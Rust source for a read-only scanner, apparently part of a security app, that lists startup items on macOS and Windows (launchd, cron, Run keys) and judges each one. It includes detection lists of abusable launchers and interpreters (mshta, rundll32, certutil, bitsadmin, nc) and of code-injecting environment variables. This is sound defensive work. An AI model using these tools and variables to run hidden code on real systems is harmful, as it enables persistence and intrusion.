//! `--list-startup`: what starts by itself on this computer, each item judged with the same
//! read-only inspection as `--check-file`. Nothing is moved, switched off, stopped, recorded
//! or sent. Every definition file (a launchd plist, a registry value, a crontab line, a
//! shortcut) is written by someone else and is hostile input: it is opened without following
//! links, never waited on (pipes), read up to a size limit, parsed by `plutil` with no shell,
//! and every item and the whole run have time limits. It runs in a child process of the app.
//!
//! The rule for every verdict: an item is `NothingFound` only if the thing that actually runs
//! was resolved to one canonical regular file and that exact file was inspected with a real
//! result (a trusted signature, a clean score, or the owner's always-allow). Anything else is
//! `NotChecked`, or `WorthALook` when the item runs code indirectly or inline. `Suspicious`
//! needs positive evidence. Only a short list of shapes is understood (a program that is not a
//! general-purpose tool; a known interpreter with known options and one script by full path);
//! everything else counts as not understood, and so is every setting or argument that is not
//! plainly harmless. What an inspected file itself loads or calls later is not followed, so the
//! app calls the best verdict "No warning signs" and never shows it as green.

use crate::ai_policy;
use crate::bin_ai::BinaryAiScanner;
use crate::check_file::{self, Verdict as FileVerdict};
use crate::config::AppConfig;
use crate::engine::{self, FileKind};
use crate::platform;
use crate::process_guard;
use crate::skiplist::LiveSkipped;
use serde::{Deserialize, Serialize};
use std::fs;
use std::path::{Path, PathBuf};
use std::sync::{mpsc, Arc};
use std::time::{Duration, Instant};

pub const MAX_ITEMS: usize = 500;
/// A launch definition is a few hundred bytes; this is far beyond any real one.
pub const MAX_DEFINITION_BYTES: u64 = 1024 * 1024;
const MAX_DIR_ENTRIES: usize = 2000;
// Display limits, in bytes: 500 items at these sizes, every character escaped, stay under
// MAX_REPORT_BYTES. What is judged is never cut.
const MAX_ARGS: usize = 16;
const MAX_ARG: usize = 120;
const MAX_TEXT: usize = 200;
const MAX_PATH: usize = 400;
const MAX_REASON: usize = 400;
const MAX_REASONS: usize = 8;
const MAX_UNREADABLE: usize = 100;
/// The app reads at most this much of the answer.
pub const MAX_REPORT_BYTES: u64 = 8 * 1024 * 1024;
const ITEM_LIMIT: Duration = Duration::from_secs(20);
pub const TOTAL_LIMIT: Duration = Duration::from_secs(90);
const NO_TIME: &str = "There was not enough time to check this one. Run the check again.";

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum Verdict {
    Suspicious,
    WorthALook,
    /// What runs could not be located or inspected, so no opinion is given.
    NotChecked,
    NothingFound,
}

impl Verdict {
    fn rank(self) -> u8 {
        self as u8
    }
}

#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
pub struct StartupItem {
    pub name: String,
    /// "launch_daemon", "launch_agent", "cron", "run_key", "run_once_key" or "startup_folder".
    pub kind: String,
    /// The file or registry key that sets it up.
    pub location: String,
    pub program: Option<String>,
    pub arguments: Vec<String>,
    /// The script an interpreter (shell, Python, PowerShell...) is told to run.
    pub script: Option<String>,
    /// Only when the definition says: false when it is switched off, true when it starts itself.
    pub enabled: Option<bool>,
    /// None: could not be told (no permission, or no full path).
    pub exists: Option<bool>,
    pub trusted: bool,
    pub verdict: Verdict,
    pub score: Option<f32>,
    /// Plain-language sentences, strongest first.
    pub reasons: Vec<String>,
    /// The exact program is on the always-allow list.
    pub allowed: bool,
    /// "you", "system", "every user" or `account "NAME"`.
    pub runs_as: String,
}

#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
pub struct Unreadable {
    pub place: String,
    pub reason: String,
}

#[derive(Debug, Clone, Default, PartialEq, Serialize, Deserialize)]
pub struct StartupReport {
    /// Suspicious first.
    pub items: Vec<StartupItem>,
    pub unreadable: Vec<Unreadable>,
    /// Something was left out: more was found than is listed, or the time ran out.
    pub truncated: bool,
}

/// Text made safe to show, at most `max` bytes; "…" marks where it was cut.
fn clean(text: &str, max: usize) -> String {
    let mut out = String::new();
    for c in text
        .chars()
        .filter(|c| !check_file::is_invisible_format(*c))
    {
        let c = if c.is_control() { ' ' } else { c };
        if out.len() + c.len_utf8() > max {
            while out.len() + '…'.len_utf8() > max {
                out.pop();
            }
            out.push('…');
            break;
        }
        out.push(c);
    }
    out
}

impl StartupReport {
    /// Cuts every field to its limit, so a report is small whatever the files said.
    pub fn clamp(&mut self) {
        self.truncated |= self.items.len() > MAX_ITEMS || self.unreadable.len() > MAX_UNREADABLE;
        self.items.truncate(MAX_ITEMS);
        self.unreadable.truncate(MAX_UNREADABLE);
        for item in &mut self.items {
            for text in [&mut item.name, &mut item.kind, &mut item.runs_as] {
                *text = clean(text, MAX_TEXT);
            }
            item.location = clean(&item.location, MAX_PATH);
            for text in item.program.iter_mut().chain(item.script.iter_mut()) {
                *text = clean(text, MAX_PATH);
            }
            if item.arguments.len() > MAX_ARGS {
                let more = item.arguments.len() - (MAX_ARGS - 1);
                item.arguments.truncate(MAX_ARGS - 1);
                item.arguments.push(format!("… and {more} more"));
            }
            for arg in &mut item.arguments {
                *arg = clean(arg, MAX_ARG);
            }
            item.reasons.truncate(MAX_REASONS);
            for reason in &mut item.reasons {
                *reason = clean(reason, MAX_REASON);
            }
        }
        for place in &mut self.unreadable {
            place.place = clean(&place.place, MAX_PATH);
            place.reason = clean(&place.reason, MAX_REASON);
        }
    }
}

/// One definition as read from its file, uncut, before anyone has looked at the program.
#[derive(Debug, Clone, Default)]
pub struct Candidate {
    pub name: String,
    pub kind: &'static str,
    pub location: String,
    pub program: Option<String>,
    pub arguments: Vec<String>,
    pub enabled: Option<bool>,
    pub runs_as: String,
    /// Findings about the definition itself, already worded (for example "others can change it").
    pub notes: Vec<String>,
    /// Why what runs is not certain (a shortcut, an unknown setting): at best `NotChecked`.
    pub doubts: Vec<String>,
    /// The folder it starts in, when known: there a file can be named without a path.
    pub folder: Option<PathBuf>,
    /// A line a shell will run (cron): the command-line rules are applied to all of it.
    pub shell_command: Option<String>,
    /// It runs with full system rights.
    pub as_root: bool,
}

struct Found {
    /// Each with the rank of what its text alone says: the strongest are kept when there are
    /// too many, and judged first.
    candidates: Vec<(u8, Candidate)>,
    unreadable: Vec<Unreadable>,
    truncated: bool,
    max_items: usize,
    /// No definition is opened after this, so reading them cannot use up the time for judging.
    deadline: Instant,
    /// Windows lists what starts from the registry and file names, and opens no definition.
    #[cfg_attr(windows, allow(dead_code))]
    skipped: Arc<LiveSkipped>,
}

impl Found {
    fn late(&self) -> bool {
        Instant::now() >= self.deadline
    }

    fn push(&mut self, candidate: Candidate) {
        let rank = quick_look(&candidate).verdict(false).rank();
        if self.candidates.len() >= self.max_items {
            self.truncated = true;
            let weakest = self.candidates.iter().enumerate();
            match weakest.max_by_key(|(_, (r, _))| *r) {
                Some((at, (r, _))) if *r > rank => self.candidates.remove(at),
                _ => return,
            };
        }
        self.candidates.push((rank, candidate));
    }

    fn unreadable(&mut self, place: impl Into<String>, reason: impl Into<String>) {
        if self.unreadable.len() < MAX_UNREADABLE {
            self.unreadable.push(Unreadable {
                place: place.into(),
                reason: reason.into(),
            });
        } else {
            self.truncated = true;
        }
    }
}

// ---- Pure helpers (tested on every OS) ----

/// Where a program lives when that is worth a mention: "temp", "downloads" or "hidden".
pub fn risky_location(path: &str) -> Option<&'static str> {
    let norm = path.replace('\\', "/").to_lowercase();
    let parts: Vec<&str> = norm.split('/').filter(|p| !p.is_empty()).collect();
    let temp_roots = [
        "/tmp/",
        "/private/tmp/",
        "/var/tmp/",
        "/private/var/tmp/",
        "/var/folders/",
        "/private/var/folders/",
    ];
    if temp_roots.iter().any(|root| norm.starts_with(root))
        || parts.iter().any(|p| matches!(*p, "temp" | "tmp"))
    {
        Some("temp")
    } else if parts.contains(&"downloads") {
        Some("downloads")
    } else if parts
        .iter()
        .any(|p| p.starts_with('.') && !matches!(*p, "." | ".."))
    {
        Some("hidden")
    } else {
        None
    }
}

/// Whose name an item borrows: Apple's reverse-domain labels, or anything with "Microsoft".
pub fn claimed_vendor(name: &str) -> Option<&'static str> {
    let n = name.trim().to_lowercase();
    if n.starts_with("com.apple.") || n.starts_with("apple ") {
        Some("Apple")
    } else if n.contains("microsoft") || n.starts_with("windows ") {
        Some("Microsoft")
    } else {
        None
    }
}

/// A label that says outright whose it is.
fn exact_vendor_label(name: &str) -> bool {
    let n = name.trim().to_lowercase();
    n.starts_with("com.apple.") || n.starts_with("com.microsoft.")
}

/// The lower-case file name of a program, without ".exe".
fn program_stem(program: &str) -> String {
    let name = program.rsplit(['/', '\\']).next().unwrap_or(program);
    let lower = name.to_lowercase();
    lower.strip_suffix(".exe").unwrap_or(&lower).to_string()
}

/// A program name without its version: "python3.12" and "bash-5.2" are still Python and bash.
fn base_name(stem: &str) -> &str {
    stem.trim_end_matches(|c: char| c.is_ascii_digit() || matches!(c, '.' | '-'))
}

/// Programs that run a script or a command given to them: trusting the program says nothing
/// about what it is told to run.
const INTERPRETERS: &[&str] = &[
    "sh",
    "bash",
    "zsh",
    "dash",
    "ksh",
    "csh",
    "tcsh",
    "fish",
    "python",
    "pythonw",
    "perl",
    "ruby",
    "php",
    "node",
    "nodejs",
    "osascript",
    "lua",
    "powershell",
    "pwsh",
    "cmd",
    "wscript",
    "cscript",
    "mshta",
    "tclsh",
    "expect",
    "java",
    "javaw",
    "deno",
    "bun",
    "irb",
    "swift",
];

/// Programs whose job is to start or load something else they are given.
const LAUNCHERS: &[&str] = &[
    "env",
    "nohup",
    "nice",
    "xargs",
    "caffeinate",
    "sudo",
    "doas",
    "awk",
    "gawk",
    "nawk",
    "mawk",
    "busybox",
    "toybox",
    "launchctl",
    "sandbox-exec",
    "rundll32",
    "regsvr32",
    "msbuild",
    "installutil",
    "regasm",
    "regsvcs",
    "msiexec",
    "wmic",
    "forfiles",
    "pcalua",
    "conhost",
    "certutil",
    "bitsadmin",
    "schtasks",
    "cmstp",
    "odbcconf",
    "wsl",
    "msdt",
    "hh",
    "dotnet",
];

/// The same, but with names other makers use too: only the operating system's own count.
const OS_LAUNCHERS: &[&str] = &[
    "open",
    "arch",
    "time",
    "timeout",
    "script",
    "find",
    "make",
    "gmake",
    "rake",
    "at",
    "atrun",
    "batch",
    "cron",
    "periodic",
    "su",
    "login",
    "ssh",
    "rsync",
    "git",
    "vim",
    "vi",
    "ex",
    "view",
    "ed",
    "emacs",
    "gdb",
    "lldb",
    "dtrace",
    "sqlite3",
    "xcrun",
    "xcodebuild",
    "erb",
    "gem",
    "npm",
    "npx",
    "automator",
    "installer",
    "screen",
    "tmux",
    "watch",
    "tar",
    "nc",
    "explorer",
    "start",
    "control",
    "mmc",
    "sc",
];

/// Operating system tools that only show or wait, whatever they are told.
const PLAIN_OS_TOOLS: &[&str] = &["ls", "true", "false", "echo", "sleep", "date"];

fn named_in(list: &[&str], stem: &str) -> bool {
    list.contains(&stem) || list.contains(&base_name(stem))
}

pub fn is_interpreter(stem: &str) -> bool {
    named_in(INTERPRETERS, stem)
}

/// A path that names one file on this computer without asking anything else: from the root, or
/// from a drive letter on Windows. Never a bare name, a relative path, a network share or a
/// device path (opening `\\host\x` would contact that host).
pub fn full_path(path: &str, windows: bool) -> bool {
    let b = path.as_bytes();
    if windows {
        b.len() > 3 && b[0].is_ascii_alphabetic() && b[1] == b':' && matches!(b[2], b'\\' | b'/')
    } else {
        path.starts_with('/')
    }
}

/// The script an interpreter is given, when every option before it is a known harmless one and
/// the script has a full path. None: not understood.
pub fn script_of<'a>(stem: &str, args: &'a [String]) -> Option<&'a str> {
    type Pairs<'x> = &'x [(&'x str, &'x [&'x str])];
    const SET: Pairs = &[("-o", &["pipefail", "errexit", "nounset", "xtrace"])];
    let name = base_name(stem);
    // (single-letter flags, whole words, options with a value, option that must be there
    // because without it another file runs first, option before the script)
    let (flags, words, pairs, needed, before): (&str, &[&str], Pairs, &[&str], &[&str]) = match name
    {
        "sh" | "bash" | "dash" | "ksh" => ("euvx", &["--norc", "--noprofile"], SET, &[], &[]),
        "zsh" => ("efuvx", &[], SET, &["f"], &[]),
        "csh" | "tcsh" => ("efvx", &[], &[], &["f"], &[]),
        "python" | "pythonw" => ("bBEIOqsSuv", &[], &[], &[], &[]),
        "perl" => ("wTt", &[], &[], &[], &[]),
        "ruby" => ("w", &[], &[], &[], &[]),
        "node" | "nodejs" => ("", &[], &[], &[], &[]),
        "osascript" => ("", &[], &[("-l", &["JavaScript", "AppleScript"])], &[], &[]),
        "powershell" | "pwsh" => (
            "",
            &[
                "-noprofile",
                "-nop",
                "-noninteractive",
                "-noni",
                "-nologo",
                "-nol",
            ],
            &[("-executionpolicy", &[]), ("-ep", &[]), ("-ex", &[])],
            &["-noprofile", "-nop"],
            &["-file", "-f"],
        ),
        "wscript" | "cscript" => ("", &["//nologo", "//b"], &[], &[], &[]),
        _ => return None,
    };
    let ignores_case = matches!(name, "powershell" | "pwsh" | "wscript" | "cscript");
    let mut seen_needed = needed.is_empty();
    let mut i = 0;
    loop {
        let arg = if ignores_case {
            args.get(i)?.to_ascii_lowercase()
        } else {
            args.get(i)?.clone()
        };
        if let Some((_, values)) = pairs.iter().find(|(option, _)| *option == arg) {
            let value = args.get(i + 1)?;
            if !values.is_empty() && !values.contains(&value.as_str()) {
                return None;
            }
            i += 2;
            continue;
        }
        let cluster = arg
            .strip_prefix('-')
            .filter(|f| !f.is_empty() && f.chars().all(|c| flags.contains(c)));
        if cluster.is_none() && !words.contains(&arg.as_str()) {
            break;
        }
        seen_needed |= needed
            .iter()
            .any(|n| *n == arg || cluster.is_some_and(|c| c.contains(n)));
        i += 1;
    }
    if !before.is_empty() {
        let option = args.get(i)?.to_ascii_lowercase();
        if !before.contains(&option.as_str()) {
            return None;
        }
        i += 1;
    }
    let script = args.get(i)?.as_str();
    let full = full_path(script, false) || full_path(script, true);
    (seen_needed && full && !script.starts_with("//")).then_some(script)
}

/// Settings that make a program load other code before its own.
pub fn loads_other_code(variable: &str) -> bool {
    matches!(
        variable,
        "ENV"
            | "BASH_ENV"
            | "SHELLOPTS"
            | "ZDOTDIR"
            | "RUBYOPT"
            | "RUBYLIB"
            | "NODE_OPTIONS"
            | "NODE_PATH"
            | "ELECTRON_RUN_AS_NODE"
            | "JAVA_TOOL_OPTIONS"
            | "_JAVA_OPTIONS"
            | "PYTHONPATH"
            | "PYTHONHOME"
            | "PYTHONSTARTUP"
            | "PYTHONUSERBASE"
            | "PYTHONPLATLIBDIR"
            | "PYTHONPYCACHEPREFIX"
            | "PYTHONEXECUTABLE"
            | "PYTHONBREAKPOINT"
            | "PYTHONWARNINGS"
            | "PYTHONINSPECT"
            | "DEVELOPER_DIR"
            | "DOTNET_STARTUP_HOOKS"
            | "OPENSSL_CONF"
            | "LESSOPEN"
            | "HOME"
            | "CFFIXED_USER_HOME"
    ) || ["DYLD_", "LD_", "PERL5", "BASH_FUNC_", "__XPC_"]
        .iter()
        .any(|prefix| variable.starts_with(prefix))
}

/// Settings known to change nothing about what runs (PATH only matters for a bare program name,
/// which is then not looked up). Every other one is not understood.
pub fn harmless_variable(variable: &str) -> bool {
    matches!(
        variable,
        "PATH"
            | "LANG"
            | "TZ"
            | "TMPDIR"
            | "USER"
            | "LOGNAME"
            | "PYTHONUNBUFFERED"
            | "PYTHONDONTWRITEBYTECODE"
    ) || variable.starts_with("LC_")
}

fn plain_name(name: &str) -> bool {
    name.starts_with(|c: char| c.is_ascii_alphanumeric())
        && name.chars().all(|c| c.is_ascii_alphanumeric() || c == '-')
}

/// `-x` or `--some-name`.
pub fn is_bare_switch(arg: &str) -> bool {
    arg.strip_prefix("--")
        .or_else(|| arg.strip_prefix('-'))
        .is_some_and(plain_name)
}

/// An argument that names no file and carries no command: a bare switch, or `--name=value` with
/// a value that is no path and no existing file. Every other one is not understood.
pub fn harmless_argument(arg: &str, is_file: &dyn Fn(&str) -> bool) -> bool {
    is_bare_switch(arg)
        || arg
            .strip_prefix("--")
            .and_then(|rest| rest.split_once('='))
            .is_some_and(|(name, value)| {
                plain_name(name) && !value.contains(['/', '\\', ':', ';']) && !is_file(value)
            })
}

/// Every part of an argument that could name a file on this computer. On Windows never one that
/// would contact another computer.
pub fn paths_in(arg: &str, windows: bool) -> Vec<&str> {
    let mut parts = vec![arg];
    parts.extend(path_in(arg, windows));
    parts.extend(arg.split([',', ';', '=', '@']));
    if !windows {
        parts.extend(arg.split([',', ';', '=', '@', ':']));
    }
    parts.retain(|part| {
        full_path(part, windows)
            || !(part.is_empty()
                || part.starts_with(['/', '\\'])
                || (windows && part.contains(':')))
    });
    parts
}

/// Windows starts these itself. Anything else it opens with another program, which is not the
/// file that was looked at.
pub fn runs_by_itself(path: &str, windows: bool) -> bool {
    let lower = path.to_lowercase();
    !windows || [".exe", ".com", ".scr"].iter().any(|e| lower.ends_with(e))
}

/// Why a definition cannot be fully relied on: launchd and the system's property-list reader can
/// understand anything but XML in plain UTF-8 differently.
pub fn definition_doubt(bytes: &[u8]) -> Option<&'static str> {
    if bytes.starts_with(b"bplist") {
        return Some("It is a binary property list, which macOS may read differently than this check does, so what it starts is not certain.");
    }
    let bytes = bytes.strip_prefix(b"\xef\xbb\xbf").unwrap_or(bytes);
    let plain = std::str::from_utf8(bytes).is_ok_and(|text| {
        let text = text.to_ascii_lowercase();
        let utf8_only = |declaration: &str| {
            let declaration = declaration.split("?>").next().unwrap_or_default();
            declaration.split("encoding").skip(1).all(|rest| {
                let value = rest.trim_start().strip_prefix('=').map(str::trim_start);
                value.is_some_and(|v| v.starts_with("\"utf-8\"") || v.starts_with("'utf-8'"))
            })
        };
        text.trim_start().starts_with('<')
            && !text.contains('\0')
            && text.split("<?xml").skip(1).all(utf8_only)
    });
    (!plain).then_some("It is not written as XML in plain UTF-8 text, which macOS may read differently than this check does, so what it starts is not certain.")
}

/// Splits what follows a program the way Windows does: spaces separate, double quotes group.
pub fn split_arguments(text: &str) -> Vec<String> {
    let mut args = Vec::new();
    let mut current = String::new();
    let mut started = false;
    let mut quoted = false;
    let mut chars = text.chars().peekable();
    while let Some(c) = chars.next() {
        match c {
            '\\' if chars.peek() == Some(&'"') => {
                current.push('"');
                chars.next();
                started = true;
            }
            '"' => {
                quoted = !quoted;
                started = true;
            }
            c if c.is_whitespace() && !quoted => {
                if started {
                    args.push(std::mem::take(&mut current));
                    started = false;
                }
            }
            c => {
                current.push(c);
                started = true;
            }
        }
    }
    if started {
        args.push(current);
    }
    args
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub struct ParsedCommand {
    pub program: String,
    pub arguments: Vec<String>,
    /// The program path has spaces and was not in quotes: Windows may start a different file.
    pub unquoted_spaces: bool,
}

/// A Windows command line (a Run value, a service path) as program and arguments. A quoted
/// path ends at the closing quote. An unquoted one is ambiguous (`C:\Program Files\A\a.exe -x`),
/// so, like Windows, the shortest prefix that names an existing file wins, with ".exe" added to
/// a name that has no extension; with none, the first word is taken. `exists` is the file check,
/// passed in so this stays pure; it is only asked about full paths on this computer.
pub fn parse_command_line(text: &str, exists: &dyn Fn(&str) -> bool) -> ParsedCommand {
    let text = text.trim();
    // The file Windows would start for this path, and whether it had to add ".exe".
    let find = |path: &str| {
        if !full_path(path, true) {
            return None;
        }
        let name = path.rsplit(['\\', '/']).next().unwrap_or(path);
        let with_exe = format!("{path}.exe");
        if !name.is_empty() && !name.contains('.') && exists(&with_exe) {
            return Some((with_exe, true));
        }
        exists(path).then(|| (path.to_string(), false))
    };
    if let Some(rest) = text.strip_prefix('"') {
        let (program, tail) = rest.split_once('"').unwrap_or((rest, ""));
        let program = program.trim();
        return ParsedCommand {
            program: find(program).map_or_else(|| program.to_string(), |(p, _)| p),
            arguments: split_arguments(tail),
            unquoted_spaces: false,
        };
    }
    let boundaries = text
        .char_indices()
        .filter(|(_, c)| c.is_whitespace())
        .map(|(i, _)| i)
        .take(64);
    for end in boundaries.chain(std::iter::once(text.len())) {
        if let Some((program, added)) = find(text[..end].trim_end()) {
            return ParsedCommand {
                unquoted_spaces: program.contains(char::is_whitespace)
                    || (added && end < text.len()),
                program,
                arguments: split_arguments(&text[end..]),
            };
        }
    }
    let end = text.find(char::is_whitespace).unwrap_or(text.len());
    ParsedCommand {
        program: text[..end].to_string(),
        arguments: split_arguments(&text[end..]),
        unquoted_spaces: false,
    }
}

/// One Run value as a candidate. `expand` is what the registry says (REG_EXPAND_SZ): only then
/// does Windows replace `%NAME%`.
pub fn run_value(
    text: &str,
    expand: bool,
    lookup: &dyn Fn(&str) -> Option<String>,
    exists: &dyn Fn(&str) -> bool,
) -> Candidate {
    let text = if expand {
        expand_env(text, lookup)
    } else {
        text.to_string()
    };
    let parsed = parse_command_line(&text, exists);
    let mut c = Candidate {
        program: (!parsed.program.is_empty()).then_some(parsed.program),
        arguments: parsed.arguments,
        ..Candidate::default()
    };
    if parsed.unquoted_spaces {
        c.notes.push("Its path has spaces but no quotation marks around it, which Windows can misread and so start a different file.".into());
    }
    c
}

/// What Task Manager's on/off switch recorded for a startup item (StartupApproved): an odd
/// first byte means switched off.
pub fn startup_approved(data: &[u8]) -> bool {
    data.first().is_none_or(|b| b & 1 == 0)
}

/// `%NAME%` replaced from `lookup`; unknown names are left as they are.
pub fn expand_env(text: &str, lookup: &dyn Fn(&str) -> Option<String>) -> String {
    let mut out = String::new();
    let mut rest = text;
    while let Some(start) = rest.find('%') {
        out.push_str(&rest[..start]);
        let after = &rest[start + 1..];
        match after.find('%') {
            Some(len) if len > 0 && lookup(&after[..len]).is_some() => {
                out.push_str(&lookup(&after[..len]).unwrap_or_default());
                rest = &after[len + 1..];
            }
            _ => {
                out.push('%');
                rest = after;
            }
        }
    }
    out.push_str(rest);
    out
}

#[derive(Debug, Default, PartialEq, Eq)]
pub struct Crontab {
    /// `NAME=value` lines.
    pub settings: Vec<(String, String)>,
    /// (schedule, command exactly as written)
    pub jobs: Vec<(String, String)>,
}

/// A crontab's settings and jobs. Comments, blank lines and broken lines are neither.
pub fn parse_crontab(text: &str) -> Crontab {
    let mut tab = Crontab::default();
    for line in text.lines().map(str::trim) {
        if line.is_empty() || line.starts_with('#') {
            continue;
        }
        if let Some((name, value)) = line.split_once('=') {
            let name = name.trim().trim_matches(['"', '\'']);
            if !name.contains(char::is_whitespace) {
                let value = value.trim().trim_matches(['"', '\'']);
                tab.settings.push((name.to_string(), value.to_string()));
                continue;
            }
        }
        let fields = if line.starts_with('@') { 1 } else { 5 };
        let mut command = line;
        for _ in 0..fields {
            let end = command.find(char::is_whitespace).unwrap_or(command.len());
            command = command[end..].trim_start();
        }
        if !command.is_empty() {
            let schedule = line[..line.len() - command.len()]
                .split_whitespace()
                .collect::<Vec<_>>()
                .join(" ");
            tab.jobs.push((schedule, command.to_string()));
        }
    }
    tab
}

/// Cron hands every line to a shell. Only a full path and plain words mean the same to it as
/// they say; with anything else the shell decides what runs.
pub fn is_plain_command(command: &str) -> bool {
    let first = command.split_whitespace().next().unwrap_or_default();
    first.starts_with('/')
        && !first.contains('=')
        && command.chars().all(|c| {
            c.is_ascii_alphanumeric()
                || matches!(c, ' ' | '_' | '.' | '/' | ':' | '@' | ',' | '+' | '=' | '-')
        })
}

/// One top-level setting of a property list; the parts inside it that no check needs are not kept.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum Setting {
    Text(String),
    Flag(bool),
    /// An array; None stands for an entry that is not text.
    List(Vec<Option<String>>),
    /// A dictionary's keys.
    Keys(Vec<String>),
    Other,
}

fn unescape_xml(text: &str) -> String {
    text.replace("&lt;", "<")
        .replace("&gt;", ">")
        .replace("&quot;", "\"")
        .replace("&apos;", "'")
        .replace("&amp;", "&")
}

/// The top-level settings in the XML that `plutil -convert xml1` writes (no comments, CDATA or
/// other entities there). None when it is not a dictionary. Dates, data, numbers and anything
/// deeper are passed over, so none of them can hide the rest.
pub fn read_plist_xml(xml: &str) -> Option<Vec<(String, Setting)>> {
    let mut settings = Vec::new();
    let mut key: Option<String> = None;
    let mut open: Option<(String, Setting)> = None;
    let mut depth = 0usize;
    let mut rest = xml;
    loop {
        let (_, after) = rest.split_once('<')?;
        let (tag, after) = after.split_once('>')?;
        rest = after;
        let value = match tag {
            "dict" | "array" => {
                depth += 1;
                let empty = if tag == "dict" {
                    Setting::Keys(Vec::new())
                } else {
                    Setting::List(Vec::new())
                };
                match depth {
                    1 if tag != "dict" => return None,
                    2 => open = Some((key.take()?, empty)),
                    3 => {
                        if let Some((_, Setting::List(list))) = &mut open {
                            list.push(None);
                        }
                    }
                    _ => {}
                }
                continue;
            }
            "/dict" | "/array" => {
                depth = depth.checked_sub(1)?;
                match depth {
                    0 => return Some(settings),
                    1 => settings.push(open.take()?),
                    _ => {}
                }
                continue;
            }
            "dict/" if depth == 0 => return Some(settings),
            "dict/" => Setting::Keys(Vec::new()),
            "array/" => Setting::List(Vec::new()),
            "true/" => Setting::Flag(true),
            "false/" => Setting::Flag(false),
            "string/" => Setting::Text(String::new()),
            _ if tag.starts_with(['?', '!', '/']) || tag.starts_with("plist") => continue,
            _ => {
                let (inner, after) = rest.split_once("</")?;
                rest = after.split_once('>')?.1;
                match tag {
                    "key" => {
                        if depth == 1 {
                            key = Some(unescape_xml(inner));
                        } else if let (2, Some((_, Setting::Keys(keys)))) = (depth, &mut open) {
                            keys.push(unescape_xml(inner));
                        }
                        continue;
                    }
                    "string" => Setting::Text(unescape_xml(inner)),
                    _ => Setting::Other,
                }
            }
        };
        match (depth, &mut open) {
            (1, _) => settings.push((key.take()?, value)),
            (2, Some((_, Setting::List(list)))) => list.push(match value {
                Setting::Text(text) => Some(text),
                _ => None,
            }),
            _ => {}
        }
    }
}

fn digest_of(hex: &str) -> Option<[u8; 32]> {
    if hex.len() != 64 || !hex.is_ascii() {
        return None;
    }
    let mut digest = [0u8; 32];
    for (byte, pair) in digest.iter_mut().zip(hex.as_bytes().chunks(2)) {
        *byte = u8::from_str_radix(std::str::from_utf8(pair).ok()?, 16).ok()?;
    }
    Some(digest)
}

/// Whether this is The Nex's own launchd service, exactly as the installer writes it: the right
/// label for its kind, the arguments the installer gives, and the program is the installed engine
/// itself. `file_secure` / `folder_secure` say that file and its folder are root-owned and
/// not writable by others (see `root_owned_closed`), so nobody else could have swapped it.
pub fn is_own_service(
    name: &str,
    kind: &str,
    program: &str,
    arguments: &[String],
    engine: &Path,
    file_secure: bool,
    folder_secure: bool,
) -> bool {
    let shape = match (name, kind) {
        ("com.thenex.edr", "launch_daemon") => arguments.is_empty(),
        ("com.thenex.edr.notifier", "launch_agent") => arguments == ["--notifier"],
        _ => false,
    };
    shape && Path::new(program) == engine && file_secure && folder_secure
}

/// Root-owned, not a link, and no one but the owner may write it. Always false off Unix.
#[cfg(unix)]
fn root_owned_closed(path: &Path, want_dir: bool) -> bool {
    use std::os::unix::fs::MetadataExt;
    fs::symlink_metadata(path).is_ok_and(|m| {
        let kind_ok = if want_dir { m.is_dir() } else { m.is_file() };
        kind_ok && m.uid() == 0 && m.mode() & 0o022 == 0
    })
}

#[cfg(not(unix))]
fn root_owned_closed(_path: &Path, _want_dir: bool) -> bool {
    false
}

/// Writable by everyone, or (for a root-owned file) by a group beyond wheel and admin, who can
/// become root anyway.
#[cfg(unix)]
fn loose_permissions(meta: &fs::Metadata) -> bool {
    use std::os::unix::fs::MetadataExt;
    let mode = meta.mode();
    mode & 0o002 != 0 || (meta.uid() == 0 && mode & 0o020 != 0 && !matches!(meta.gid(), 0 | 80))
}

#[cfg(not(unix))]
fn loose_permissions(_meta: &fs::Metadata) -> bool {
    false
}

/// Whether someone other than the owner or an administrator can change `path`, or swap it by
/// changing a folder on the way to it.
fn others_can_change(path: &Path) -> bool {
    path.ancestors().enumerate().any(|(i, p)| {
        fs::metadata(p).is_ok_and(|m| loose_permissions(&m) && !(i > 0 && is_sticky(&m)))
    })
}

/// In a sticky folder (/tmp) only a file's owner can replace it.
#[cfg(unix)]
fn is_sticky(meta: &fs::Metadata) -> bool {
    std::os::unix::fs::MetadataExt::mode(meta) & 0o1000 != 0
}

#[cfg(not(unix))]
fn is_sticky(_meta: &fs::Metadata) -> bool {
    false
}

/// Whether an ordinary account owns `path` or a folder on the way to it.
#[cfg(unix)]
fn ordinary_owner(path: &Path) -> bool {
    use std::os::unix::fs::MetadataExt;
    path.ancestors()
        .any(|p| fs::metadata(p).is_ok_and(|m| m.uid() != 0))
}

#[cfg(not(unix))]
fn ordinary_owner(_path: &Path) -> bool {
    false
}

// ---- Judging one item ----

fn plain_item(c: &Candidate, verdict: Verdict, reasons: Vec<String>) -> StartupItem {
    StartupItem {
        name: c.name.clone(),
        kind: c.kind.to_string(),
        location: c.location.clone(),
        program: c.program.clone(),
        arguments: c.arguments.clone(),
        script: None,
        enabled: c.enabled,
        exists: None,
        trusted: false,
        verdict,
        score: None,
        reasons,
        allowed: false,
        runs_as: c.runs_as.clone(),
    }
}

fn location_reason(kind: &str, what: &str) -> String {
    match kind {
        "temp" => format!(
            "It starts {what} from a temporary folder, where programs do not normally live."
        ),
        "downloads" => format!(
            "It starts {what} from a Downloads folder, where programs do not normally live."
        ),
        _ => format!("It starts {what} from a hidden folder."),
    }
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Claim {
    Confirmed,
    /// Signed, but nothing here can say by whom.
    Unknown,
    Contradicted,
}

/// Whether the program really comes from the vendor its name claims. `signed` is whether that
/// vendor's own signature is on it, None where that cannot be told (Windows); `os_file` is
/// whether it is part of the operating system.
pub fn check_claim(vendor: &str, os_file: bool, signed: Option<bool>, trusted: bool) -> Claim {
    let os_vendor = if signed.is_some() {
        "Apple"
    } else {
        "Microsoft"
    };
    match signed {
        _ if os_file && vendor == os_vendor => Claim::Confirmed,
        Some(true) => Claim::Confirmed,
        None if trusted => Claim::Unknown,
        _ => Claim::Contradicted,
    }
}

/// Why a path was not resolved to a file. `look`: that is worth a mention by itself.
struct Trouble {
    exists: Option<bool>,
    look: bool,
    why: String,
}

/// The one canonical regular file `text` names. Nothing is opened, and a path that is not a
